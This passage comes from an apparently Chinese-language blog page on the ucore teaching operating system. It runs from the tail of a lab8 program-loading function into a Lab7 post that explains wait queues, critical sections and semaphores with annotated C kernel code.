assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="number">-2</span>*PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="number">-3</span>*PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="number">-4</span>*PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;---- 设置当前进程的mm,sr3,设置CR3寄存器 ----&gt; */</span></span><br><span class="line">    </span><br><span class="line">    mm_count_inc(mm); <span class="comment">/* 设置并返回&quot;共享该虚拟内存空间mva的进程数&quot; */</span></span><br><span class="line">    current-&gt;mm = mm; <span class="comment">/* 设置当前进程的&quot;proc_struct-&gt;mm&quot;为该虚拟内存空间mva */</span></span><br><span class="line">    current-&gt;cr3 = PADDR(mm-&gt;pgdir); <span class="comment">/* 设置当前进程的&quot;proc_struct-&gt;cr3&quot;为该页目录表的地址 */</span></span><br><span class="line">    lcr3(PADDR(mm-&gt;pgdir)); <span class="comment">/* 设置CR3寄存器为当前页目录表的物理地址 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* &lt;---- lab8新增:设置execve所启动的程序参数 ----&gt; */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint32_t</span> argv_size=<span class="number">0</span>, i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; i ++) &#123;</span><br><span class="line">        argv_size += strnlen(kargv[i],EXEC_MAX_ARG_LEN + <span class="number">1</span>)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uintptr_t</span> stacktop = USTACKTOP - (argv_size/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)+<span class="number">1</span>)*<span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">    <span class="keyword">char</span>** uargv=(<span class="keyword">char</span> **)(stacktop  - argc * <span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line">    </span><br><span class="line">    argv_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; i ++) &#123; <span class="comment">/* 直接将传入的参数压入至新栈的底部 */</span></span><br><span class="line">        uargv[i] = <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)(stacktop + argv_size ), kargv[i]);</span><br><span class="line">        argv_size +=  strnlen(kargv[i],EXEC_MAX_ARG_LEN + <span class="number">1</span>)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    stacktop = (<span class="keyword">uintptr_t</span>)uargv - <span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line">    *(<span class="keyword">int</span> *)stacktop = argc;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;---- 为用户环境设置trapframe ----&gt; */</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span> =</span> current-&gt;tf; <span class="comment">/* 构建中断帧 */</span></span><br><span class="line">    <span class="built_in">memset</span>(tf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct trapframe)); <span class="comment">/* 把trapframe清零 */</span></span><br><span class="line">    tf-&gt;tf_cs = USER_CS; <span class="comment">/* 初始化中断帧的各个条目 */</span></span><br><span class="line">    tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS;</span><br><span class="line">    tf-&gt;tf_esp = stacktop;</span><br><span class="line">    tf-&gt;tf_eip = elf-&gt;e_entry;</span><br><span class="line">    tf-&gt;tf_eflags = FL_IF;</span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">bad_cleanup_mmap:</span><br><span class="line">    exit_mmap(mm);</span><br><span class="line">bad_elf_cleanup_pgdir:</span><br><span class="line">    put_pgdir(mm);</span><br><span class="line">bad_pgdir_cleanup_mm:</span><br><span class="line">    mm_destroy(mm);</span><br><span class="line">bad_mm:</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/01/Ucore-Lab7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/01/Ucore-Lab7/" class="post-title-link" itemprop="url">Ucore-Lab7</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-01 11:55:59" itemprop="dateCreated datePublished" datetime="2022-05-01T11:55:59+08:00">2022-05-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-05-03 13:12:04" itemprop="dateModified" datetime="2022-05-03T13:12:04+08:00">2022-05-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>23k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>21 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="原子操作"><a href="#原子操作" class="headerlink" title="原子操作"></a>原子操作</h2><p>原子操作（Atomic Operator）是指一次不存在任何中断或失效的操作</p>
<h2 id="等待队列"><a href="#等待队列" class="headerlink" title="等待队列"></a>等待队列</h2><p>前面的实验中已经实现了进程运行队列（就绪队列），而等待队列和它们类似：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> wait_head; <span class="comment">/* 等待队列的头结点(哨兵节点) */</span></span><br><span class="line">&#125; <span class="keyword">wait_queue_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span> <span class="comment">/* 关联的进程 */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> wakeup_flags; <span class="comment">/* 唤醒标识 */</span></span><br><span class="line">    <span class="keyword">wait_queue_t</span> *wait_queue; <span class="comment">/* 该节点所属的等待队列 */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> wait_link; <span class="comment">/* 其等待队列的链表结构,可以看作是队列结点 */</span></span><br><span class="line">&#125; <span class="keyword">wait_t</span>;</span><br></pre></td></tr></table></figure>
<p><strong>等待队列结构底层操作：</strong></p>
<ul>
<li>wait_init：初始化 wait 等待队列项，为 wait（等待队列结构体）绑定一个 proc（进程）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">wait_init</span><span class="params">(<span class="keyword">wait_t</span> *wait, struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    wait-&gt;proc = proc; <span class="comment">/* 设置关联的进程 */</span></span><br><span class="line">    wait-&gt;wakeup_flags = WT_INTERRUPTED; <span class="comment">/* 等待状态可中断(苏醒) */</span></span><br><span class="line">    list_init(&amp;(wait-&gt;wait_link)); <span class="comment">/* 初始化等待队列 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>wait_queue_init：初始化等待队列</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">wait_queue_init</span><span class="params">(<span class="keyword">wait_queue_t</span> *<span class="built_in">queue</span>)</span> </span>&#123;</span><br><span class="line">    list_init(&amp;(<span class="built_in">queue</span>-&gt;wait_head)); <span class="comment">/* 初始化等待队列 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>wait_queue_add：将 wait 节点项插入等待队列</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">wait_queue_add</span><span class="params">(<span class="keyword">wait_queue_t</span> *<span class="built_in">queue</span>, <span class="keyword">wait_t</span> *wait)</span> </span>&#123;</span><br><span class="line">    assert(list_empty(&amp;(wait-&gt;wait_link)) &amp;&amp; wait-&gt;proc != <span class="literal">NULL</span>);</span><br><span class="line">    wait-&gt;wait_queue = <span class="built_in">queue</span>; <span class="comment">/* 设置该等待队列结点所属的等待队列 */</span></span><br><span class="line">    list_add_before(&amp;(<span class="built_in">queue</span>-&gt;wait_head), &amp;(wait-&gt;wait_link)); <span class="comment">/* 插头 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>wait_queue_del：将 wait 项从等待队列中移除</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">wait_queue_del</span><span class="params">(<span class="keyword">wait_queue_t</span> *<span class="built_in">queue</span>, <span class="keyword">wait_t</span> *wait)</span> </span>&#123;</span><br><span class="line">    assert(!list_empty(&amp;(wait-&gt;wait_link)) &amp;&amp; wait-&gt;wait_queue == <span class="built_in">queue</span>);</span><br><span class="line">    list_del_init(&amp;(wait-&gt;wait_link)); <span class="comment">/* 脱链 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>wait_queue_next：获取等待队列中wait节点的下一项</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">wait_t</span> *</span></span><br><span class="line"><span class="function"><span class="title">wait_queue_next</span><span class="params">(<span class="keyword">wait_queue_t</span> *<span class="built_in">queue</span>, <span class="keyword">wait_t</span> *wait)</span> </span>&#123;</span><br><span class="line">    assert(!list_empty(&amp;(wait-&gt;wait_link)) &amp;&amp; wait-&gt;wait_queue == <span class="built_in">queue</span>);</span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = list_next(&amp;(wait-&gt;wait_link));</span><br><span class="line">    <span class="keyword">if</span> (le != &amp;(<span class="built_in">queue</span>-&gt;wait_head)) &#123;</span><br><span class="line">        <span class="keyword">return</span> le2wait(le, wait_link); <span class="comment">/* 根据链表信息获取wait结构体 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>wait_queue_prev：获取等待队列中wait节点的前一项</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">wait_t</span> *</span></span><br><span class="line"><span class="function"><span class="title">wait_queue_prev</span><span class="params">(<span class="keyword">wait_queue_t</span> *<span class="built_in">queue</span>, <span class="keyword">wait_t</span> *wait)</span> </span>&#123;</span><br><span class="line">    assert(!list_empty(&amp;(wait-&gt;wait_link)) &amp;&amp; wait-&gt;wait_queue == <span class="built_in">queue</span>);</span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = list_prev(&amp;(wait-&gt;wait_link));</span><br><span class="line">    <span class="keyword">if</span> (le != &amp;(<span class="built_in">queue</span>-&gt;wait_head)) &#123;</span><br><span class="line">        <span class="keyword">return</span> le2wait(le, wait_link); <span class="comment">/* 根据链表信息获取wait结构体 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>wait_queue_first：获取等待队列的第一项</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">wait_t</span> *</span></span><br><span class="line"><span class="function"><span class="title">wait_queue_first</span><span class="params">(<span class="keyword">wait_queue_t</span> *<span class="built_in">queue</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = list_next(&amp;(<span class="built_in">queue</span>-&gt;wait_head));</span><br><span class="line">    <span class="keyword">if</span> (le != &amp;(<span class="built_in">queue</span>-&gt;wait_head)) &#123;</span><br><span class="line">        <span class="keyword">return</span> le2wait(le, wait_link); <span class="comment">/* 根据链表信息获取wait结构体 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>wait_queue_last：获取等待队列的最后一项</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">wait_t</span> *</span></span><br><span class="line"><span class="function"><span class="title">wait_queue_last</span><span class="params">(<span class="keyword">wait_queue_t</span> *<span class="built_in">queue</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = list_prev(&amp;(<span class="built_in">queue</span>-&gt;wait_head));</span><br><span class="line">    <span class="keyword">if</span> (le != &amp;(<span class="built_in">queue</span>-&gt;wait_head)) &#123;</span><br><span class="line">        <span class="keyword">return</span> le2wait(le, wait_link); <span class="comment">/* 根据链表信息获取wait结构体 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>wait_queue_empty：检查等待队列是否为空</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span></span></span><br><span class="line"><span class="function"><span class="title">wait_queue_empty</span><span class="params">(<span class="keyword">wait_queue_t</span> *<span class="built_in">queue</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> list_empty(&amp;(<span class="built_in">queue</span>-&gt;wait_head));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span></span></span><br><span class="line"><span class="function"><span class="title">list_empty</span><span class="params">(<span class="keyword">list_entry_t</span> *<span class="built_in">list</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>-&gt;next == <span class="built_in">list</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>wait_in_queue：检查 wait 项是否在等待队列中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span></span></span><br><span class="line"><span class="function"><span class="title">wait_in_queue</span><span class="params">(<span class="keyword">wait_t</span> *wait)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !list_empty(&amp;(wait-&gt;wait_link));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>等待队列休眠/唤醒等高层操作：</strong> </p>
<ul>
<li>wakeup_wait：将等待队列中的 wait 项对应的线程唤醒</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">wakeup_wait</span><span class="params">(<span class="keyword">wait_queue_t</span> *<span class="built_in">queue</span>, <span class="keyword">wait_t</span> *wait, <span class="keyword">uint32_t</span> wakeup_flags, <span class="keyword">bool</span> del)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (del) &#123;</span><br><span class="line">        wait_queue_del(<span class="built_in">queue</span>, wait); <span class="comment">/* 根据del标识来决定该wait结构体是否保留 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    wait-&gt;wakeup_flags = wakeup_flags; <span class="comment">/* 已经苏醒 */</span></span><br><span class="line">    wakeup_proc(wait-&gt;proc); <span class="comment">/* 唤醒该进程 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">wakeup_proc</span><span class="params">(struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    assert(proc-&gt;state != PROC_ZOMBIE);</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (proc-&gt;state != PROC_RUNNABLE) &#123;</span><br><span class="line">            proc-&gt;state = PROC_RUNNABLE; <span class="comment">/* 设置&quot;PROC_RUNNABLE&quot; */</span></span><br><span class="line">            proc-&gt;wait_state = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (proc != current) &#123;</span><br><span class="line">                sched_class_enqueue(proc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            warn(<span class="string">&quot;wakeup runnable process.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>wakeup_first：将等待队列中的第一项对应的线程唤醒</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">wakeup_first</span><span class="params">(<span class="keyword">wait_queue_t</span> *<span class="built_in">queue</span>, <span class="keyword">uint32_t</span> wakeup_flags, <span class="keyword">bool</span> del)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">wait_t</span> *wait;</span><br><span class="line">    <span class="keyword">if</span> ((wait = wait_queue_first(<span class="built_in">queue</span>)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* 调用wait_queue_first获取等待队列的第一项,然后将其唤醒 */</span></span><br><span class="line">        wakeup_wait(<span class="built_in">queue</span>, wait, wakeup_flags, del);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>wakeup_queue：将等待队列中的所有项对应的线程全部唤醒</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">wakeup_queue</span><span class="params">(<span class="keyword">wait_queue_t</span> *<span class="built_in">queue</span>, <span class="keyword">uint32_t</span> wakeup_flags, <span class="keyword">bool</span> del)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">wait_t</span> *wait;</span><br><span class="line">    <span class="keyword">if</span> ((wait = wait_queue_first(<span class="built_in">queue</span>)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (del) &#123; <span class="comment">/* 根据del标识来决定该wait结构体是否保留 */</span></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                wakeup_wait(<span class="built_in">queue</span>, wait, wakeup_flags, <span class="number">1</span>); </span><br><span class="line">            &#125; <span class="keyword">while</span> ((wait = wait_queue_first(<span class="built_in">queue</span>)) != <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                wakeup_wait(<span class="built_in">queue</span>, wait, wakeup_flags, <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">while</span> ((wait = wait_queue_next(<span class="built_in">queue</span>, wait)) != <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>wait_current_set：为当前进程绑定 wait，使其休眠并且插入等待队列</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">wait_current_set</span><span class="params">(<span class="keyword">wait_queue_t</span> *<span class="built_in">queue</span>, <span class="keyword">wait_t</span> *wait, <span class="keyword">uint32_t</span> wait_state)</span> </span>&#123;</span><br><span class="line">    assert(current != <span class="literal">NULL</span>);</span><br><span class="line">    wait_init(wait, current); <span class="comment">/* 为wait绑定进程current */</span></span><br><span class="line">    current-&gt;state = PROC_SLEEPING; <span class="comment">/* 设置当前进程状态为:PROC_SLEEPING(睡眠) */</span></span><br><span class="line">    current-&gt;wait_state = wait_state; <span class="comment">/* 设置等待原因(人工输入) */</span></span><br><span class="line">    wait_queue_add(<span class="built_in">queue</span>, wait); <span class="comment">/* 将wait节点项插入等待队列 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>wait_current_del：将 wait 项（绑定有当前进程）从等待队列中删除（如果存在的话）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wait_current_del(queue, wait)                                       \</span></span><br><span class="line"><span class="meta">    do &#123;                                                                    \</span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">if</span> (wait_in_queue(wait)) &#123;                                          \</span></span><br><span class="line"><span class="meta">            wait_queue_del(queue, wait);                                    \</span></span><br><span class="line"><span class="meta">        &#125;                                                                   \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !__KERN_SYNC_WAIT_H__ */</span></span></span><br></pre></td></tr></table></figure>
<h2 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a>临界区</h2><p>每个进程中访问临界资源的那段程序称为临界区，临界资源是一次仅允许一个进程使用的共享资源，每次只准许一个进程进入临界区，进入后不允许其他进程进入  </p>
<p>相关区域的概念：</p>
<ul>
<li>临界区（critical section）：进程中访问临界资源的一段需要互斥执行的代码</li>
<li>进入区（entry section）：检查可否进入临界区的一段代码，如果可以进入，则设置“正在访问临界区”标志</li>
<li>退出区（exit section）：清除标志</li>
<li>剩余区（remainder section）：代码中的其余部分</li>
</ul>
<h2 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h2><p>信号量是一个有整数值的对象，可以用两个函数来操作它</p>
<p>Linux中的信号量是一种睡眠锁，本质上是一个计数器，用于多进程对共享数据对象的读取，它和管道有所不同，它不以传送数据为主要目的，它主要是用来保护共享资源（信号量也属于临界资源），使得资源在一个时刻只有一个进程独享</p>
<ul>
<li>信号量（Semaphore）是操作系统提供的一种协调共享资源访问的方法<ul>
<li>软件同步是平等线程间的一种同步协商机制</li>
<li>OS 是管理者，地位高于进程</li>
<li>用信号量表示系统资源的数量</li>
</ul>
</li>
<li>信号量是一种抽象数据类型<ul>
<li>由一个整数（sem）变量和两个原子操作（PV）组成</li>
<li>整数sem：<ul>
<li>sem &gt;= 0：代表剩余可供并发进程使用的资源实体数</li>
<li>sem &lt; 0：代表正在使用的资源实体数</li>
</ul>
</li>
<li>P操作：<ul>
<li>sem —</li>
<li>如果 sem &lt; 0，则该进程进入阻塞队列（等待队列）</li>
<li>如果 sem &gt;= 0，则该进程继续执行</li>
</ul>
</li>
<li>V操作：<ul>
<li>sem ++</li>
<li>如果 sem &lt; 0，则唤醒阻塞队列中的第一个等待信号量的进程 </li>
<li>如果 sem &gt; 0，则该进程继续执行</li>
</ul>
</li>
</ul>
</li>
<li>信号量是被保护的整数变量<ul>
<li>初始化完成后，只能通过 P() 和 V() 操作修改</li>
<li>由操作系统来保证，PV操作是原子操作</li>
</ul>
</li>
</ul>
<p><strong>PV操作</strong></p>
<p>PV操作是一种实现进程互斥与同步的有效方法，PV操作与信号量的处理相关（P表示通过的意思，V表示释放的意思）</p>
<p>PV操作是典型的同步机制之一，用一个信号量与一个消息联系起来</p>
<ul>
<li>当信号量的值为“0”时，表示期望的消息尚未产生</li>
<li>当信号量的值非“0”时，表示期望的消息已经存在</li>
</ul>
<p>用PV操作实现进程同步时，调用P操作测试消息是否到达，调用V操作发送消息</p>
<p><strong>ucore 中采用以下结构体来管理信号量</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> value; <span class="comment">/* 信号量值 */</span></span><br><span class="line">    <span class="keyword">wait_queue_t</span> wait_queue; <span class="comment">/* 等待队列 */</span></span><br><span class="line">&#125; <span class="keyword">semaphore_t</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>value 是用于判断该信号量能否进入临界区的关键参数</li>
<li>wait_queue 记录了该信号量所属的等待队列，便于之后的 <code>wait_current_set</code> 和 <code>wait_current_del</code> 把当前进程填入或取出该等待队列</li>
</ul>
<p><strong>进入临界区时，uCore会执行 down 函数</strong></p>
